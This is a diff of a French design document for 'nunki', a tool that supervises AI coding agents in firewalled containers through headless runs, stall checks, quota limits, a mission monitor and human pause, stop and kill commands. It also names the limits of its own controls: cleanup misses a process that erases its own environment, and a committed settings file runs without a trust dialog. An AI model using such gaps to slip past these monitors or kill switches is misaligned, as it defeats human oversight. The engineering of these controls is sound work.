+  part : un script qui finit en `\r` ne tourne pas.
+- **Les ajouts du projet à son image vont dans `Dockerfile.project`**, dans
+  son home et sous aucune stack (et `Dockerfile.project.stages` pour un
+  `COPY --from` d'image officielle). Il est ajouté après les compléments de
+  toutes les stacks — il peut appeler n'importe laquelle de leurs chaînes
+  d'outils —, part de l'utilisateur agent et y revient : `nunki` le ferme par
+  `USER agent`. Les Dockerfiles des stacks restent alors ceux de nunki et
+  suivent ses versions. Ce qui n'est pas un ajout — changer l'image de base,
+  les options de rustup — reste un Dockerfile réécrit, donc au projet.
+- **Une image dit de quel Dockerfile elle vient.** L'étiquette
+  `nunki.dockerfile` porte l'empreinte du Dockerfile composé ; `nunki check`
+  est rouge et `mission start` refuse quand il a changé depuis la
+  construction — un modèle rafraîchi, un complément ou une étape du projet
+  retouchés.
+
+**Ce que la stack Python rend, et ce qu'elle ne rend pas** (mesuré avant
+livraison) : `uv` pour le verrou, `ruff`, `mypy` et `pytest`
+pour la batterie, `mutmut` pour la campagne, `osv-scanner` hors ligne pour
+l'audit et `trufflehog` pour les secrets — le même que Rust, puisqu'un secret
+n'a pas d'écosystème. Deux écarts assumés, tous deux écrits dans les scripts
+eux-mêmes plutôt que tus :
+
+- **Aucun contrôle de licence.** Rust joue `cargo deny check bans licenses
+  sources`, trois étapes sans réseau ; `osv-scanner --licenses` passe par
+  deps.dev, que la liste blanche du codeur ne nomme pas. La stack le dit plutôt
+  que de laisser croire à une vérification qui n'a pas lieu.
+- **La campagne ne teste que les fichiers touchés, mais entiers.** `mutmut
+  run` prend des motifs glob sur les noms de mutants (mesuré sur 3.8.0) : un
+  motif par fichier touché, `<chemin pointé>.x*`, fait tester les mutants de ce
+  fichier et eux seuls, avec les seuls tests qui les atteignent. La génération
+  et les statistiques couvrent toujours tout l'arbre, et rien ne restreint la
+  campagne aux lignes changées : c'est pourquoi elle ne donne aucun compte
+  (4.4). Des motifs qui ne prennent aucun mutant — un module de constantes, un
+  script hors de `source_paths` — sont refusés par mutmut ; la campagne y lit
+  une branche sans rien de mutable, d'après ce que mutmut a laissé sur disque,
+  et non une campagne qui n'a pas pu tourner. L'autre restriction de mutmut,
+  `only_mutate`, vit dans le `pyproject.toml` du projet, que la campagne ne
+  réécrira pas : la copie propre de `HEAD` est aussi celle où tourne la
+  porte 6.
+
+**Ce que la stack Next.js rend** (mesuré avant livraison) :
+`pnpm` pour le verrou, `prettier`, `eslint`, `tsc` et `vitest` pour la
+batterie, `Playwright` pour celle de l'intégrateur, `Stryker` pour la
+campagne, `osv-scanner` hors ligne pour l'audit et `trufflehog` pour les
+secrets. Trois choses lui sont propres, chacune parce qu'elle a été mesurée :
+
+- **Les navigateurs vivent dans l'image**, pas dans le projet, parce que le
+  CDN de Playwright n'est nommé par aucune liste blanche et ne doit pas
+  l'être. La version est épinglée et écrite dans l'image ; `system.sh`
+  compare et nomme celle qu'elle porte, parce que le conseil de Playwright —
+  « lancez `playwright install` » — est inapplicable derrière le pare-feu.
+- **La batterie de l'intégrateur teste l'application**, pas des modules :
+  Playwright pilote un vrai Chromium contre ce que `run.sh` a lancé.
+- **Le statut de Stryker ne dit rien** — 0 avec des survivants, 0 sur un
+  fichier absent, 0 sur une source qui ne se parse pas — donc c'est son
+  rapport qui fait foi, et son identifiant de mutant étant un entier
+  séquentiel par fichier, `nunki` en reconstruit un stable à partir de la
+  position, du mutateur et du remplacement.
+
+### 4.2 bis — Les plateformes
+
+Le système doit fonctionner **aussi bien sur macOS que sur Linux sous WSL**.
+Windows natif n'est pas une cible : WSL est Linux. Ce que ça impose,
+et qui se vérifie en CI sur les deux :
+
+| point | macOS | Linux / WSL | règle pour `nunki` |
+|---|---|---|---|
+| binaire | arm64 et x86_64 | x86_64 et arm64 | Rust, compilé nativement sur chaque cible en CI (la compilation croisée macOS → Linux demande un éditeur de liens, on ne compte pas dessus) ; aucune bibliothèque native du système n'est liée — mais avec `ureq`, `ring`, la cryptographie de `rustls`, **compile son propre C et son assembleur au build** : il faut un compilateur C pour construire `nunki`, pas pour l'exécuter (mesuré : `ring` 0.17 et `cc` dans l'arbre sur les deux cibles) ; à l'exécution, la commande Compose du moteur, et le client HTTP embarqué pour l'API de la forge |
+| moteur de conteneurs | Docker Desktop **ou OrbStack** (VM Linux, API Docker compatible) ; Podman Desktop existe aussi, cible seconde | Docker Desktop avec WSL2, ou Docker Engine dans WSL ; Podman, cible seconde | l'API est la même ; `nunki` détecte la socket, ne suppose pas son chemin ; en mode rootless, l'uid vu par l'hôte passe par les subuid, et l'adaptateur de moteur le sait |
+| propriétaire des fichiers | mappé par VirtioFS ; cas connus de fichiers vus `root:root` | l'uid de l'hôte doit être celui de l'utilisateur du conteneur, sinon un fichier `600` est illisible et **git refuse l'arbre** (`safe.directory`) | `nunki` passe uid et gid de l'hôte au build et au run ; l'image pré-crée les points de montage des **volumes nommés** avec cet uid, sinon ils naissent à root et la toolchain ne peut pas y écrire ; `nunki check` vérifie que git accepte l'arbre depuis le conteneur |
+| chemins montables | Docker Desktop ne partage que `/Users`, `/Volumes`, `/private`, `/tmp` par défaut | tout le système de fichiers WSL ; **`/mnt/c` très lent et sans permissions** | dépôt et slots vivent sous un chemin partagé sur macOS et dans le système de fichiers Linux sous WSL ; `nunki check` refuse `/mnt/` et un chemin non partagé |
+| casse des noms | APFS insensible par défaut | ext4 sensible, dans le conteneur aussi | `nunki check` signale deux chemins ne différant que par la casse |
+| services de l'hôte depuis un conteneur | `host.docker.internal` | idem avec Docker Desktop ; à déclarer soi-même avec Docker Engine seul | l'adaptateur de moteur le sait, pas le fichier de profil du projet ; et l'hôte n'est joignable que si la mission le déclare (4.1 bis) |
+| résolveur DNS du conteneur | dépend du moteur, pas de la plateforme : 127.0.0.11 sur un réseau utilisateur, autre chose sur le réseau par défaut (sous **OrbStack**, par exemple : `0.250.250.200`) | 127.0.0.11 sur un réseau utilisateur sous Engine | ne pas supposer l'adresse. Dans un profil d'agent la question ne se pose plus : le sidecar **détourne le port 53** de l'espace réseau partagé vers son propre résolveur (4.1 bis §3), quelle que soit l'adresse écrite dans `/etc/resolv.conf` par le moteur ; la liste `search` que le moteur y recopie depuis l'hôte, elle, est neutralisée par les sondes de 4.1 bis §7, qui demandent des noms absolus |
+| fins de ligne | LF | LF, mais un éditeur Windows peut écrire CRLF | `nunki init` pose un `.gitattributes` (`* text=auto eol=lf`) s'il n'en existe pas ; `nunki check` vérifie ce qu'il lit |
+| mémoire | celle de Docker Desktop | WSL2 prend la moitié de la RAM par défaut (`.wslconfig`) | `nunki check` affiche la mémoire vue par le moteur et avertit sous un seuil |
+| clone local | même système de fichiers | dans WSL | `--no-hardlinks` (3.2) ; le slot est créé à côté du dépôt, jamais sur un autre volume |
+| tmux | inutile sur l'hôte | inutile sur l'hôte | ne sert que **dans l'image**, comme dernier recours de `state()` pour un harnais sans sortie structurée ; c'est le Dockerfile qui l'installe |
+| CI | un runner macOS avec un moteur de conteneurs installé par la CI elle-même | un runner Linux | les tests d'intégration de `nunki` tournent sur les deux ; ceux qui ont besoin d'un moteur sont marqués et sautent proprement sans lui |
+
+**Deux versions de Compose, et c'est tant mieux.** La machine de
+développement porte **Compose v5.1.2** (moteur 29.4.0), le coureur Ubuntu de
+GitHub en porte **v2.38.2** — trois versions majeures d'écart. Plutôt que d'aligner les deux, on garde
+l'écart et on s'en sert : c'est la seule couverture inter-versions qu'on
+aura, et elle correspond à la réalité des machines qu'`nunki` rencontrera.
+
+Ce qui est **vérifié à l'identique sur la v2.38.2** : les trois
+profils générés sont acceptés ; le pare-feu pose ses règles, passe *healthy*,
+et l'agent démarre ensuite ; `network_mode` et `networks` restent mutuellement
+exclusifs, au mot près ; un changement de profil sous un nom de projet stable
+laisse le conteneur du service intact. Et la **batterie vivante entière** —
+les deux profils, les onze sondes — passe sous les deux versions.
+
+Ce que ça impose : **v2.38 est le plancher** tant que rien n'exige plus
+récent, et les tests qui touchent un moteur acceptent `HQ_COMPOSE` pour être
+rejoués sous une autre commande que `docker compose`. Un jour où une des deux
+versions divergera, c'est un test qui le dira, pas un utilisateur.
+
+### 4.3 Les adaptateurs — un par harnais
+
+La méthode de travail : l'humain travaille depuis une session d'assistant
+au HQ, à qui il dit quoi faire ; c'est elle qui crée le slot, le conteneur, lance le harnais dedans, et lui
+parle. **Cette méthode ne change pas.** Ce qui change, c'est où vit la
+plomberie propre à chaque harnais.
+
+**Il y a deux harnais dans ce flux, et un seul a besoin d'un adaptateur.**
+
+- La **session du HQ** est un harnais (Claude Code aujourd'hui), mais elle ne
+  pilote rien directement : elle lance `nunki`. Son agnosticité ne coûte rien,
+  parce que ce qu'un assistant doit savoir pour s'en servir, `nunki` le dit
+  dans ses propres sorties : son aide, et le geste suivant que chaque verbe
+  nomme — dont `nunki mission wait`, pour être prévenu d'un arrêt sans sonder
+  (4.5). Pas dans le `AGENTS.md` du dépôt, qui n'est pas celui de `nunki` :
+  `init` n'en dépose un que s'il manque, laisse intact celui qui existe (3.3),
+  et celui qu'il dépose n'est qu'un point de départ pour les règles du
+  projet (4.1). Pas d'adaptateur.
+- L'**agent dans le conteneur** est l'autre harnais, et tout ce qui le
+  concerne est propre à lui : l'installer, le connecter, le lancer avec les
+  bonnes options, savoir où vit sa configuration, lire son état, l'arrêter,
+  câbler ses gardes s'il en a. **L'adaptateur, c'est cette plomberie
+  rassemblée**, avec le même contrat pour chaque harnais.
+
+**Le contrat**, un trait Rust, une implémentation par harnais, et `nunki` ne
+tient qu'une valeur `Box<dyn Harness>` choisie par `nunki.yaml` ou par la mission :
+
+| `nunki` a besoin de | l'adaptateur sait, et `nunki` ignore |
+|---|---|
+| `provision()` — préparer l'image et le volume du harnais | ce qu'il faut installer, où vit la config (un volume nommé par slot, parce que la reprise de session en dépend), comment se **connecter sans interface**, et comment le harnais lit `AGENTS.md` |
+| `launch(role, mission, resume) -> RunHandle` — lancer un run | la ligne de commande d'une session **sans interface** avec sortie structurée, la reprise par identifiant de session (imposé par `nunki`, pas lu après coup), les drapeaux qui font qu'une permission est **refusée et non redemandée en boucle** |
+| `state(handle) -> Running \| Finished(Outcome)` | son flux structuré et son code de sortie ; le panneau tmux en dernier recours pour un harnais qui n'a rien d'autre |
+| `Outcome` — classer la fin d'un run | **fini**, **échoué pour une cause du harnais** (quota, jeton expiré, réseau, plantage) ou **échoué pour une cause de la mission**. La distinction compte : un run tombé pour quota est rejoué, il ne consomme pas un volet |
+| `stop(handle)` | le signal qui termine un tour proprement plutôt que celui qui le tranche (pour Claude Code, `SIGINT` et non `SIGTERM`) |
+| `guards()` — doubler les restrictions | hooks pour Claude Code et pour Codex, plugins pour OpenCode ; passés **à l'invocation**, jamais écrits dans le slot (3.3) ; **optionnel par construction**, la garde est ailleurs (3.2) |
+| `expose(role)` — donner un rôle | prompt système ajouté, fichier de règles, sous-agent : la forme que le harnais préfère pour recevoir le prompt du codeur, de l'intégrateur ou de la sécurité |
+
+Ce qui n'est **pas** dans l'adaptateur, et c'est ce qui rend l'agnosticité
+réelle : les prompts de rôle (des fichiers du socle), le protocole de mission,
+les portes, le flux, le clone et le conteneur. L'adaptateur les reçoit en
+argument, il ne les possède pas.
+
+**Mode sans interface, par défaut.** Lancer une session interactive dans tmux
+et lire son écran casse le détecteur à chaque changement d'affichage de la
+CLI. Les trois harnais visés ont un mode sans interface avec sortie structurée
+et reprise de session, vérifié sur leur documentation :
+
+| harnais | run | sortie | reprise | connexion sans interface | ce qu'il faut savoir |
+|---|---|---|---|---|---|
+| Claude Code | `claude -p` | `--output-format json` / `stream-json` | `--resume <id>`, `--session-id` pour imposer l'identifiant | jeton de longue durée (`claude setup-token`, **un navigateur et un humain une fois par an**) ou clé d'API (facturation API) | le mode de permission par défaut refuse mais laisse l'agent réessayer : `--permission-mode` et `--permission-prompts none` sont nécessaires. **Le mode est déclaré par le projet (`permission_mode:` dans `nunki.yaml`), `auto` par défaut** : `auto` laisse un classifieur décider et pousse l'agent à continuer plutôt qu'à s'arrêter pour une question ; `dontAsk` n'autorise que le pré-approuvé et refuse le reste, ce qui est plus strict mais fait finir un run sans rien avoir produit quand l'outil refusé lui était nécessaire (mesuré, voir l'adaptateur). `--permission-prompts none` reste passé **quel que soit le mode** : c'est lui qui rend une question impossible, puisque `auto` en force encore une pour une règle `ask` explicite et pour `AskUserQuestion`. Ce que `auto` coûte, documenté par Anthropic : un classifieur qui refuse rend la main à l'agent avec l'instruction de trouver une voie plus sûre, mais **3 refus consécutifs ou 20 au total terminent le processus sous `-p`** — un run qui finit sans `result`, ce que `nunki` sait déjà lire. `--bare`, futur défaut, **saute `CLAUDE.md`** et ignore le jeton : l'adaptateur passe alors les règles par `--append-system-prompt-file` et n'utilise que la clé d'API. Un `.claude/settings.json` commité dans le dépôt cible est exécuté sans dialogue de confiance : l'isolation du conteneur est ce qui le rend acceptable |
+| Codex | `codex exec` | `--json` (JSON Lines), `--output-last-message`, `--output-schema` | `codex exec resume <id>` | `CODEX_API_KEY` ou `~/.codex/auth.json` | hooks depuis 0.117 (`PreToolUse` bloque ou réécrit) |
+| OpenCode | `opencode run` | `--format json` | `--session <id>`, `--continue` | à vérifier avant d'écrire l'adaptateur | plugins `tool.execute.before` qui bloquent ; `--auto` approuve ce qui n'est pas refusé |
+
+Trois choses en découlent :
+
+- **L'état de l'agent n'est plus deviné.** Le processus tourne ou a fini, et
+  la sortie dit ce qu'il a fait. `watch` a **deux** états, tourne et fini ;
+  « bloqué » n'est plus un état lu sur un écran mais un constat des contrôles
+  de vie décrits ci-dessous.
+- **Un run par lot, et un lot dure ce qu'il dure.** Une mission est une suite de
+  **lots** — petits, chacun avec sa preuve, commités en commits qui tiennent
+  seuls — et un **run** est l'invocation du harnais pour **un** lot : `nunki` le
+  lance avec la consigne « fais le lot N », attend sa fin, lit `JOURNAL.md` et
+  `VERDICT.json`, applique les règles (lots restants, volets, tentatives), et
+  relance le lot suivant en reprenant la session — la même d'un lot au
+  suivant, et à travers une panne du harnais ou un tour épargné ; une
+  session neuve pour une nouvelle tentative après un échec, car un contexte
+  qui a échoué n'est pas celui qu'on veut garder. Un run **n'a pas de durée
+  maximale** : il se termine quand le lot est fini et prouvé, ou quand le HQ
+  constate qu'il est bloqué. **Jamais un arrêt parce qu'une durée est
+  atteinte.** **Un run headless finit avec le tour de l'agent**, même si une
+  commande qu'il a lancée tourne encore en arrière-plan : chaque rôle en est
+  prévenu, ne finit jamais son tour tant que quelque chose qu'il a lancé
+  tourne, et attend une commande d'arrière-plan par une commande au premier
+  plan. Le contrat de sortie d'un run, vérifié par `nunki` : le lot est
+  commité et sa preuve passe, ou le run dit qu'il a échoué ; l'arbre est
+  commitable ; le journal porte un bloc `ÉTAT DE REPRISE` qui nomme `HEAD`, le
+  lot, la prochaine action ; pour le codeur, il se termine par
+  `Lot: <lot> — done`, `Lot: <lot> — failed: <raison>` ou
+  `Lot: <lot> — awaits ruling: <quoi>` (une décision attendue du HQ sur des
+  survivants nommés, voir 4.4 et 4.5) ; et pour le dernier
+  lot, `VERDICT.json` existe. Un run qui sort sans ce contrat est une
+  tentative échouée du lot. `nunki verify` relit le run du codeur dans cet
+  ordre : un tour épargné ou une panne du harnais rejoue la même tentative
+  sans juger l'arbre ; sinon les portes 1 à 4, puis la ligne `Lot:` du bloc,
+  et d'elle seule — une ligne absente, en échec ou qui nomme un autre lot est
+  une tentative échouée, dont la raison est portée dans `FOLLOWUP_HQ.md` pour
+  la tentative suivante. Le run suivant est lancé aussitôt.
+- **Ce qu'un run laisse derrière lui est arrêté, en confort.** L'enveloppe
+  d'un run marque chacun de ses processus de `NUNKI_RUN=<session>`. Quand
+  `verify` relit un run fini, tout processus du conteneur qui porte encore
+  cette marque reçoit TERM, puis KILL quelques secondes après, et c'est dit
+  comme une étape (`LeftBehind`). C'est un confort, pas une garde : un
+  processus qui efface son propre environnement n'est pas trouvé.
+- **Deux niveaux de contrôle pendant un run**, et ce qui les distingue :
+  - **toutes les 15 minutes, la vie et le progrès**, par les signaux seuls,
+    sans rien demander à l'agent — le processus est vivant, le flux du harnais
+    a produit de nouveaux événements, l'arbre ou le journal a changé, les
+    appels d'outil ne se répètent pas à l'identique. Silencieux, sans coût
+    pour l'agent ;
+  - **toutes les 45 minutes, le checkpoint**, le protocole hérité : l'agent a
+    pour consigne d'écrire à ce rythme un bloc `ÉTAT DE REPRISE` dans son
+    journal (commit courant, étape du lot, prochaine action, et **ce qu'il
+    attend s'il attend** — une compilation, un run long — avec l'heure et la
+    durée prévue). Le HQ lit ce bloc. Présent et cohérent avec les signaux :
+    le lot continue. Absent mais du progrès : le lot continue, la consigne est
+    rappelée au run suivant. Absent **et** aucun signal depuis le dernier
+    contrôle : on entre dans le cas bloqué.
+- **Le kill switch, seulement sur un blocage constaté.** Trois contrôles de
+  quinze minutes sans aucun changement, ou une répétition du même appel
+  d'outil au-delà d'un seuil, ou un processus mort ou muet : `nunki` arrête le
+  run, le classe **tentative échouée du lot**, écrit le constat dans le
+  journal, et relance une tentative avec ce constat en consigne. Un lot a
+  droit à **N tentatives**, trois par défaut ; au-delà, la mission s'arrête et
+  remonte à l'humain avec les journaux des tentatives côte à côte. Réserve
+  dite : « aucun changement » est une heuristique, et un agent qui attend une
+  compilation longue ne produit rien pendant plusieurs minutes — d'où le seuil
+  à trois contrôles, et l'attente déclarée au checkpoint, qui lève
+  l'ambiguïté quand le bloc est là.
+- **Un garde-fou humain sur la durée, pas un couperet.** Au-delà d'une durée
+  très large sur un même lot avec du progrès — huit heures par défaut — le HQ
+  ne tue pas : il remonte à l'humain que le lot dure, et continue en
+  attendant sa réponse.
+- **Les causes du harnais restent à part.** Quota, jeton expiré, réseau,
+  plantage du harnais : le run est rejoué sans consommer de tentative, avec
+  une attente croissante entre deux essais et un plafond d'attente au-delà
+  duquel `nunki` s'arrête et remonte à l'humain, plutôt que d'attendre une nuit
+  sur un jeton révoqué. Les attentes : 2, 4, 8, 16, 32
+  minutes, puis une heure à chaque fois ; **six heures** comptées depuis la
+  première panne d'affilée (`harness_wait_hours`, dans les bornes), assez
+  pour qu'une fenêtre d'abonnement vidée la nuit se rouvre et que `nunki`
+  reprenne seul. Au-delà, `nunki` pose sur la mission la même retenue que
+  `nunki mission stop`, à son nom et avec la raison, et `nunki mission resume` la
+  lève. Une panne d'authentification (401, session déconnectée) va à
+  l'humain **tout de suite** : aucune attente ne répare un jeton, et c'est
+  l'adaptateur qui la reconnaît, là où le code d'état est encore lisible.
+  `nunki verify` ne dort pas — il lance et rend la main : l'attente est un « pas
+  avant » écrit dans l'état de la mission et respecté au site de lancement ;
+  c'est le moniteur de la mission (plus bas) qui rappelle `verify` à
+  l'échéance. Un run que le harnais a porté jusqu'au bout remet
+  le compte à zéro, `resume` aussi. Aujourd'hui seuls les runs que `nunki` relit
+  — intégrateur et sécurité — y passent : la fin d'un run du codeur n'est
+  pas encore relue par `nunki`.
+- **La consommation de l'abonnement se mesure par ses deux fenêtres.**
+  Un abonnement est borné à la fois sur
+  cinq heures et sur la semaine, et le harnais qui le sait le dit : Claude
+  Code écrit dans le flux de chaque run un `rate_limit_event` qui porte
+  l'utilisation des deux fenêtres et l'heure de leur remise à zéro (mesuré
+  sur v2.1.266, émis quand l'utilisation bouge). Le lire est le travail de
+  l'**adaptateur du harnais du rôle**, pas de l'agent — l'agent ne voit pas
+  ces chiffres, et les écrire lui coûterait des tokens — ni du superviseur :
+  le flux d'un run est celui du jeton qui l'a lancé, si bien qu'un codeur sur
+  Codex et un superviseur sur Claude, ou deux jetons, font deux mesures
+  justes. `nunki` garde la dernière mesure **par compte**, dans
+  `~/.nunki/usage/<compte>.json` que le superviseur relit, et `nunki mission
+  status` l'affiche, ou dit « non mesuré » — jamais zéro — quand le harnais
+  ne la rend pas. Mesurée chaque fois que `nunki` lit un run (`verify` à la
+  relecture, le moniteur et `watch` pendant qu'il tourne) et jugée **avant chaque
+  lancement** : au-delà de **90 % des cinq heures** ou de **80 % de la
+  semaine** (`five_hour_stop_percent`, `weekly_stop_percent`, dans les
+  bornes), `nunki` ne lance rien avant la remise à zéro de la fenêtre, puis
+  reprend seul — une attente, pas une retenue. Entre deux lectures la
+  dernière mesure vaut, et ce qu'une autre session consomme sur le même
+  compte n'apparaît qu'à la lecture suivante. Un run **en cours** au-delà du
+  seuil reçoit la fin de tour propre (SIGINT, comme `stop --now`) du moniteur de
+  la mission chaque minute, de `nunki verify` quand il le trouve encore actif,
+  ou de `nunki mission watch` ; la mission est marquée, pas retenue, et la relecture de ce
+  run ne coûte **aucune tentative** et ne compte pas comme une panne du
+  harnais — c'est la marque qui en décide, pas le journal, car ce qu'un
+  harnais écrit après un tour interrompu n'a pas été mesuré ; un verdict
+  écrit avant la fin du tour tient. Le codeur y est soumis comme les autres
+  rôles : son tour épargné est relu sans juger l'arbre, puis relancé dans la
+  même session.
+- **Chaque mission a son moniteur.** `nunki`
+  n'a pas de service système, et un verbe rend la main ; ce qui surveille un
+  run la nuit et relance après une attente est donc un processus à part, un
+  par mission : `nunki mission monitor <id>`, verbe interne jamais tapé, lancé
+  par `nunki mission start`, `nunki verify`, `nunki mission resume` et
+  `nunki mission retry` dès qu'il y a un
+  run à surveiller ou une attente qui finira seule, détaché du terminal
+  (`nohup`, son propre groupe de processus) pour lui survivre, et relancé par
+  le prochain de ces verbes s'il est mort (un redémarrage). Chaque minute
+  pendant un run, il mesure les deux fenêtres et arrête le run au seuil ;
+  sans run, il appelle `verify` — qui relit, attend ou relance — puis dort
+  jusqu'à la prochaine échéance connue (attente du harnais, remise à zéro
+  d'une fenêtre). Ce sommeil prend fin plus tôt dès que l'état de la mission
+  est écrit — un `verify` tapé entre-temps a pu lancer un run — ou que
+  l'attente ne tient plus, relue chaque minute. Il relit `nunki.yaml` à
+  chaque tour, comme un verbe tapé à ce moment : une mission basculée sur un
+  autre compte (plus bas) repart dans la minute, sans attendre la remise à
+  zéro de l'ancien, et sans que personne tape `verify`. Un `nunki.yaml`
+  illisible ne l'arrête pas : il garde la dernière copie lue et le dit dans
+  son journal. Il prend le verrou du slot au nom de `nunki mission monitor`,
+  si bien qu'un `nunki verify` tapé pendant ce temps dit qui le tient ; un
+  verrou pris est un humain qui conduit, et le moniteur attend son tour. Il
+  s'arrête dès que la mission attend un humain ou n'a plus rien que `nunki`
+  sache lancer — vérifiée, remise à l'humain, retenue, ou constats de sécurité
+  à trancher. `nunki
+  mission status` dit s'il veille ; `HQ_NO_MONITOR` dans l'environnement le
+  coupe, pour qui conduit à la main. Son pid et son journal sont sous
+  `monitors/` dans le HQ, et seul le binaire `nunki` peut en lancer un.
+- **« Bloqué sur une permission » n'existe plus.** Sans interface, ce qui
+  aurait demandé est refusé — la règle « refuser est sûr » tenue par
+  construction, aux drapeaux près du tableau ci-dessus.
+
+Fenêtre de checkpoint, cadence de contrôle, tentatives par lot, plafond
+d'attente du harnais, seuil
+d'immobilité, garde-fou de durée : cinq paramètres de `nunki.yaml`, l'en-tête de
+mission prime. Les valeurs par défaut (45, 15, 3, 3 contrôles, 8 h) sont
+héritées de sessions interactives ; en mode sans interface un lot bien
+découpé finit souvent avant, et elles se règlent à l'usage.
+
+**Les trois gestes de l'humain sur un agent.** Ils s'appliquent au **conteneur**, pas à
+un hook que l'agent pourrait ne pas voir, et ils **passent toujours**, verrou
+de slot ou pas, depuis n'importe quel terminal — si la session HQ est morte,
+l'humain les tape lui-même.
+
+| verbe | ce qu'il fait | ce que l'agent en voit |
+|---|---|---|
+| `nunki mission pause` / `resume` | **gèle** le conteneur de l'agent, tel quel, au milieu de ce qu'il fait ; `resume` le dégèle exactement là | rien : le processus est suspendu par le moteur de conteneurs, aucun état n'est perdu ; un appel réseau en cours vers l'API du modèle peut expirer pendant un long gel, et le harnais le rejoue |
+| `nunki mission stop --because <pourquoi>` | **arrêt propre** : `nunki` ne relancera aucun run ; le run en cours finit son lot, ou s'interrompt tout de suite avec `--now` par le signal qui termine le tour proprement, pour que l'agent écrive son état de reprise — l'ancien fichier `STOP` | sans `--now`, il finit son lot ; avec, son tour est interrompu proprement |
+| `nunki mission kill` | **frein d'urgence** : le conteneur est tué immédiatement, rien n'est attendu — l'ancien `AGENT_STOP` | rien, il n'existe plus |
+
+**Un conteneur gelé n'est pas un conteneur qui tourne.** Sur Docker 28, un
+conteneur en
+pause répond `Running=true Paused=true`, donc un adaptateur qui ne lit que
+`.State.Running` rapporte un agent gelé comme un agent au travail — et un
+contrôle d'immobilité lirait ça comme un agent qui a cessé de penser. Pire :
+`exec` dans un conteneur en pause est **refusé d'emblée** (« Container … is
+paused, unpause the container before exec »), donc la sonde qui répond
+d'habitude ne peut pas répondre, et son refus arriverait comme « je ne sais
+pas » — un silence sur un état parfaitement connu. La vivacité a donc un mot
+pour ça, de bout en bout : `Liveness::Paused`, `Presence::Paused`,
+`RunState::Paused`. C'est la doctrine d'AGENTS.md § 4 appliquée une fois de
+plus : un contrôle qui ne peut pas dire « je ne sais pas » ment, et un
+contrôle qui n'a pas de mot pour « gelé » ment aussi.
+
+`pause` et `stop` laissent le dossier de mission intact et reprenable ; après
+un `kill`, le lot en cours est une tentative échouée et la relance repart du
+dernier état de reprise écrit.
+
+**`stop` dit deux choses, et la première est inconditionnelle.** Toujours,
+la mission est **retenue** : `nunki` ne lance plus aucun run pour elle, **ni
+aucune campagne de mutation** — jusqu'à une heure de travail dans le
+conteneur du slot, que le moniteur et `verify` lanceraient sinon d'eux-mêmes
+pour la porte 7 (mesuré, #166 : retenue, la mission en relançait une au tic
+suivant). `nunki mission mutants`, qu'un humain tape par son nom, en lance
+toujours une. C'est une
+écriture dans l'état, pas un signal — l'ancien fichier `STOP` était un
+marqueur et pas un geste, et une mission peut être retenue **entre deux
+runs**, quand il n'y a précisément aucun processus à interrompre. `--now`
+choisit seulement le sort du run déjà lancé : sans lui il finit son lot, avec
+lui son tour est interrompu proprement. La retenue n'est **pas une étape** du
+flux : une mission retenue n'est ni abandonnée (`end` dit ça) ni finie, et le
+flux est exactement où il était quand on la lève. **Une retenue porte sa
+raison** : `stop` exige `--because`, et la raison paraît partout où la
+retenue était déjà montrée — `status`, `watch`, `wait`, `verify`, la ligne
+du moniteur — et au `resume`. Une mission retenue sans raison est une
+mission que la session suivante relance sans savoir pourquoi elle dormait.
+
+**C'est `resume` qui la lève** — le même verbe que celui qui dégèle un
+conteneur, parce que pour la main qui le tape c'est une seule chose : la
+mission était retenue, elle ne l'est plus. Ce verbe n'a pas besoin d'un run,
+justement parce qu'une mission retenue entre deux runs n'en a pas.
+
+`say` change de sens avec le run : il n'y a pas de canal pendant un run. Une
+consigne est déposée dans `FOLLOWUP_HQ.md` et lue au run suivant ; si elle
+presse, `stop --now` termine le run en cours proprement et la relance la
+porte.
+
+Ce que ça coûte : plus d'écran à regarder par curiosité (`nunki logs` le rend en
+lisant la sortie ; **c'est l'adaptateur de harnais qui rend son propre flux**
+— `nunki` ne parse aucun format de run, la forme du flux appartient au harnais —
+et deux règles de rendu : une ligne que `nunki` **ne sait pas lire** est
+gardée et marquée, parce qu'un log rendu en jetant l'inattendu cache
+précisément le run qui a mal tourné ; et une ligne qu'il **sait lire et
+choisit de ne pas montrer** — les événements de progression, par exemple —
+est comptée et dite une fois, parce que « je n'ai pas su lire » et « j'ai lu
+et ça ne vaut pas une ligne » sont deux faits différents), et une connexion sans interface par harnais, avec un geste
+humain une fois par an pour Claude Code, à ranger là où `provision()` monte
+le volume du harnais — un jeton révoqué arrête tous les slots d'un coup.
+
+**L'abonnement, et rien d'autre.** Les agents Claude Code se connectent avec le **jeton de longue durée de
+l'abonnement** (`claude setup-token`), jamais avec une clé d'API. Ce que ça
+engage pour l'adaptateur, et qu'il doit tenir explicitement :
+
+- **pas de `--bare`**, aujourd'hui ni quand il deviendra le défaut du mode
+  sans interface : `--bare` ignore le jeton d'abonnement et saute
+  `CLAUDE.md`. L'adaptateur lance `claude -p` sans lui, et le jour où le
+  défaut change, il passe le drapeau inverse. Les tests d'intégration de
+  l'adaptateur vérifient ce comportement contre la version installée de la
+  CLI, pour que le changement ne passe pas en silence ;
+- les règles du projet sont lues comme prévu en 4.1 : `AGENTS.md` seul, ou
+  par l'import d'un `CLAUDE.md` qui le précède ; le contrat de `nunki`
+  arrive, lui, par `--append-system-prompt-file`, qui porte le prompt de
+  rôle ;
+- la consommation des agents est prise sur la **fenêtre de l'abonnement**,
+  partagée avec la session HQ ; le plafond par mission de la section 7 se
+  compte en tokens et en runs, pas en argent, et un quota atteint est une
+  cause du harnais (attente croissante, puis l'humain) ;
+- l'option d'une clé d'API n'existe pas dans `nunki`. Si elle devient nécessaire
+  un jour — plusieurs slots qui saturent la fenêtre, un projet d'équipe —
+  c'est une décision à reprendre, pas une case à cocher.
+
+**`nunki` sait à qui il rend la main.** Une mission finit par rendre quelque
+chose à quelqu'un — un arbitrage, un verdict à accepter, un push à autoriser —
+et « en attente de l'humain » cesse de suffire dès qu'ils sont deux. Un
+arbitrage pour l'un n'est pas un arbitrage pour l'autre.
+
+- L'identité vient de l'endroit le moins surprenant qui en ait une :
+  `~/.nunki/me.yaml`, puis `git config user.name` dans le projet, puis le
+  nom de compte de la machine. **D'où vient le nom est conservé** : un nom
+  déclaré est une affirmation, un nom pris à `$USER` est une supposition, et
+  `nunki check` le dit ainsi.
+- **Un `me.yaml` qui existe et ne se lit pas ne nomme personne**, et aucune
+  autre source ne répond à sa place : l'humain a dit qui il est, et le nom de
+  git ou du compte serait celui de quelqu'un d'autre. `nunki check` le dit en
+  rouge, avec le fichier et la raison ; `nunki whoami` échoue ; et
+  `nunki mission new` sans `--for` refuse plutôt que de cadrer une mission
+  sans arbitre. Un fichier absent reste « rien de déclaré », et la source
+  suivante répond.
